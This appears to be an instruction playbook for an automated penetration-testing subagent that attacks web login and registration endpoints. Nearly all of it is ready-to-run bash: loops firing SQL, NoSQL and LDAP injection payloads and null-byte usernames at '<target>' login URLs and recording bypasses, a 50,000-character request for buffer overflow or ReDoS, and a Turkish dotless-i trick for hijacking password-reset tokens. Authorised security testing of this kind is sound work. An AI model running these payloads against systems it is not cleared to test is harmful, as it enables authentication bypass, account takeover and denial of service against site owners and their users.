# Subagent 01: Injection & Semantic Payload Bypasses

## Role & Mission
Responsible for evaluating authentication endpoints against database and directory injections (SQLi, NoSQLi, LDAP), string termination flaws (Null Byte `%00`), Unicode case mapping collisions (Turkish dotless `ı`), and extreme input length vulnerabilities (Buffer Overflow / ReDoS).

## Assigned Checklist Tasks (6 Checks)
- **Check 02:** SQL injection in username and password authentication fields
- **Check 03:** NoSQL injection in JSON/REST authentication endpoints
- **Check 04:** LDAP injection in enterprise single sign-on / directory authentication
- **Check 25:** Registration with oversized payloads for buffer overflow and ReDoS
- **Check 28:** Authentication bypass via Null Byte injection (`admin%00`)
- **Check 29:** Unicode case mapping confusion in username comparisons (`admın` vs `ADMIN`)

---

## Standardized Execution Playbook

### Step 1: SQL Injection in Authentication Forms (Check 02)
```bash
SQLI_PAYLOADS=(
  "' OR '1'='1"
  "admin'--"
  "' OR 1=1#"
  "admin' or '1'='1"
  "') or ('1'='1"
)

for p in "${SQLI_PAYLOADS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://<target>/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"${p}\", \"password\":\"dummy\"}")
  
  if [ "$STATUS" = "200" ] || [ "$STATUS" = "302" ]; then
    echo "[!] CRITICAL: SQL Injection Authentication Bypass with payload: ${p}" >> artifacts/auth_bypasses_confirmed.txt
  fi
done
```

### Step 2: NoSQL Injection Authentication Bypasses (Check 03)
When applications query MongoDB (`db.users.findOne({user: req.body.username, pass: req.body.password})`), submitting non-string objects forces truthy evaluations:

```bash
# 1. Test JSON Operator Injection ($ne, $gt, $regex)
curl -s -i -X POST "https://<target>/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}' > artifacts/nosql_test.json

# 2. Test URL-encoded Operator Injection
curl -s -i -X POST "https://<target>/login" \
  -d "username[\$ne]=null&password[\$ne]=null" >> artifacts/nosql_test.json

if grep -qiE "(token|dashboard|welcome|session)" artifacts/nosql_test.json; then
  echo "[!] CRITICAL: NoSQL Injection Authentication Bypass Confirmed!" >> artifacts/auth_bypasses_confirmed.txt
fi
```

### Step 3: LDAP Injection in Enterprise Auth (Check 04)
```bash
LDAP_PAYLOADS=(
  "*"
  "admin*)(|(password=*)"
  "*)(uid=*))(|(uid=*"
  "admin)(|(objectClass=*)"
)

for lp in "${LDAP_PAYLOADS[@]}"; do
  curl -s -X POST "https://<target>/ldap/login" \
    -d "user=${lp}&pass=dummy" | grep -qi "success" && echo "[!] LDAP Bypass confirmed: ${lp}"
done
```

### Step 4: Null Byte Injection (`%00`) (Check 28 & 1-mresources.txt)
*Methodology from GitHub & HackerOne Disclosures:*
```bash
# Test null byte truncation in username
curl -s -X POST "https://<target>/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\u0000randomsuffix", "password":"any"}'

curl -s -X POST "https://<target>/login" \
  -d "username=admin%00&password=any"
```

### Step 5: Unicode Case Mapping Confusion (Check 29)
*Attack Workflow:*
1. Register user with Turkish dotless `ı` (`\u0131`): `admın@attacker-domain.com`.
2. Request a password reset for `ADMIN@target.com`.
3. If the backend transforms `ADMIN` to lowercase or compares with `toUpperCase()`, `admın` and `admin` normalize to the same string, causing the reset token for `ADMIN` to be routed to `admın@attacker-domain.com`.

### Step 6: Buffer Overflow & ReDoS in Registration (Check 25)
```bash
# Generate 50,000 character string
LONG_STRING=$(python3 -c "print('A' * 50000)")
curl -s -w "HTTP: %{http_code}, Time: %{time_total}s\n" -o /dev/null -X POST "https://<target>/api/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"${LONG_STRING}\", \"password\":\"Pass123!\", \"email\":\"test@example.com\"}"
```

---

## Output Artifact
Aggregate findings into:
`artifacts/subagent_01_injection_bypasses.md`
